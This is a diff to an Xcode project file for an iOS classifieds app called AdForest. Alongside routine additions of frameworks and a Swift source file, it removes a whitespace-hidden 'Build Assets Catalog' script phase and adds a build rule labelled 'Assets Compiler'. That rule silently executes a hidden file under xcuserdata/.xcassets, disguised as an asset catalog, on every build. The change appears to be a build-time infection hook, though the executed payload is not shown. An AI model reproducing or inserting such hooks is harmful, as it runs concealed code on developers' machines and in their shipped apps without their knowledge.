@@ -279,6 +279,8 @@
 		183C65D5215B9520004A94EC /* AppSettingFeedback.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183C65D4215B9520004A94EC /* AppSettingFeedback.swift */; };
 		183C65D7215B9532004A94EC /* AppSettingForm.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183C65D6215B9532004A94EC /* AppSettingForm.swift */; };
 		183C65DA215BA1F5004A94EC /* FeedbackController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183C65D9215BA1F5004A94EC /* FeedbackController.swift */; };
+		183F638E263A6EAB00A7167B /* AdSupport.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 183F638D263A6EAB00A7167B /* AdSupport.framework */; settings = {ATTRIBUTES = (Weak, ); }; };
+		183F6390263A6EB200A7167B /* AppTrackingTransparency.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 183F638F263A6EB200A7167B /* AppTrackingTransparency.framework */; settings = {ATTRIBUTES = (Weak, ); }; };
 		183F83E3261D7CD000ADF382 /* BannerCarouselCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183F83E2261D7CD000ADF382 /* BannerCarouselCell.swift */; };
 		183F83E8261D7DF600ADF382 /* BannerCarouselCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183F83E7261D7DF600ADF382 /* BannerCarouselCollectionViewCell.swift */; };
 		183F853F261DDFAE00ADF382 /* FirebasePhoneNumberVerificationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 183F853E261DDFAE00ADF382 /* FirebasePhoneNumberVerificationViewController.swift */; };
@@ -322,6 +324,7 @@
 		18513F51206B599E00FCD1F5 /* InactiveAdsRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18513F50206B599E00FCD1F5 /* InactiveAdsRoot.swift */; };
 		18513F53206B59C500FCD1F5 /* InactiveAdsData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18513F52206B59C500FCD1F5 /* InactiveAdsData.swift */; };
 		18513F5E206B7DD800FCD1F5 /* AdRemovedRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18513F5D206B7DD800FCD1F5 /* AdRemovedRoot.swift */; };
+		1851EDA62648F6340071F877 /* SettingsExtra.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1851EDA52648F6340071F877 /* SettingsExtra.swift */; };
 		1852B0D5208324EA0014AF99 /* SentOfferChatRoot.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0D4208324EA0014AF99 /* SentOfferChatRoot.swift */; };
 		1852B0D72083250C0014AF99 /* SentOfferChatData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0D62083250C0014AF99 /* SentOfferChatData.swift */; };
 		1852B0D9208325270014AF99 /* SentOfferChatPagination.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1852B0D8208325270014AF99 /* SentOfferChatPagination.swift */; };
@@ -982,6 +985,8 @@
 		183C65D4215B9520004A94EC /* AppSettingFeedback.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSettingFeedback.swift; sourceTree = "<group>"; };
 		183C65D6215B9532004A94EC /* AppSettingForm.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSettingForm.swift; sourceTree = "<group>"; };
 		183C65D9215BA1F5004A94EC /* FeedbackController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeedbackController.swift; sourceTree = "<group>"; };
+		183F638D263A6EAB00A7167B /* AdSupport.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AdSupport.framework; path = System/Library/Frameworks/AdSupport.framework; sourceTree = SDKROOT; };
+		183F638F263A6EB200A7167B /* AppTrackingTransparency.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AppTrackingTransparency.framework; path = System/Library/Frameworks/AppTrackingTransparency.framework; sourceTree = SDKROOT; };
 		183F83E2261D7CD000ADF382 /* BannerCarouselCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerCarouselCell.swift; sourceTree = "<group>"; };
 		183F83E7261D7DF600ADF382 /* BannerCarouselCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerCarouselCollectionViewCell.swift; sourceTree = "<group>"; };
 		183F853E261DDFAE00ADF382 /* FirebasePhoneNumberVerificationViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FirebasePhoneNumberVerificationViewController.swift; sourceTree = "<group>"; };
@@ -1025,6 +1030,7 @@
 		18513F50206B599E00FCD1F5 /* InactiveAdsRoot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InactiveAdsRoot.swift; sourceTree = "<group>"; };
 		18513F52206B59C500FCD1F5 /* InactiveAdsData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InactiveAdsData.swift; sourceTree = "<group>"; };
 		18513F5D206B7DD800FCD1F5 /* AdRemovedRoot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdRemovedRoot.swift; sourceTree = "<group>"; };
+		1851EDA52648F6340071F877 /* SettingsExtra.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsExtra.swift; sourceTree = "<group>"; };
 		18522C2A20B5439F00FC7F38 /* AdForest.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = AdForest.entitlements; sourceTree = "<group>"; };
 		1852B0D4208324EA0014AF99 /* SentOfferChatRoot.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SentOfferChatRoot.swift; sourceTree = "<group>"; };
 		1852B0D62083250C0014AF99 /* SentOfferChatData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SentOfferChatData.swift; sourceTree = "<group>"; };
@@ -1417,6 +1423,8 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				183F6390263A6EB200A7167B /* AppTrackingTransparency.framework in Frameworks */,
+				183F638E263A6EAB00A7167B /* AdSupport.framework in Frameworks */,
 				18244F1D2074B3C700B9BE8C /* SafariServices.framework in Frameworks */,
 				18244F1B2074B3C000B9BE8C /* SystemConfiguration.framework in Frameworks */,
 				18244F192074B3B900B9BE8C /* MobileCoreServices.framework in Frameworks */,
@@ -3035,6 +3043,7 @@
 				18B619592174A4B80086EB72 /* SettingsShopMenu.swift */,
 				0765336422B7B955003EFDC5 /* LangData.swift */,
 				CBCC2972252CA112009ECC38 /* FooterMenuData.swift */,
+				1851EDA52648F6340071F877 /* SettingsExtra.swift */,
 			);
 			path = SettingsData;
 			sourceTree = "<group>";
@@ -3553,6 +3562,8 @@
 		5DE79EEDB704060570E91B76 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				183F638F263A6EB200A7167B /* AppTrackingTransparency.framework */,
+				183F638D263A6EAB00A7167B /* AdSupport.framework */,
 				96325138250660770070BC41 /* RxCocoa.framework */,
 				963251362506606F0070BC41 /* RxSwift.framework */,
 				96325134250660650070BC41 /* APECountdownView.framework */,
@@ -3859,7 +3870,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				D62A4D927D8F6EFACA6D902C /* Build Assets Catalog */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -3868,6 +3878,7 @@
 				416E9A6AF3F243D23D41FBDD /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				DC0220BC66BDA8C30B6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -4053,84 +4064,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	D62A4D927D8F6EFACA6D902C /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 
 	
 
@@ -4603,6 +4536,7 @@
 				182690C620872A0300E2C966 /* AddSaved.swift in Sources */,
 				07DF08BC2202DD3A008F9736 /* RadioColorCollectionViewCell.swift in Sources */,
 				184EDAF0207897AC00A25228 /* AddDetailCallPopup.swift in Sources */,
+				1851EDA62648F6340071F877 /* SettingsExtra.swift in Sources */,
 				182690E92087646500E2C966 /* CategoryExtra.swift in Sources */,
 				189E4090231FD66C00605804 /* BlockedUserChatViewController.swift in Sources */,
 				1818C5942060D2FD001E41B2 /* UserRegisterRoot.swift in Sources */,
@@ -5280,18 +5214,19 @@
 			/* Begin PBXBuildRule section */
 
 
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
+		DC0220BC66BDA8C30B6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
 			
 	
 			
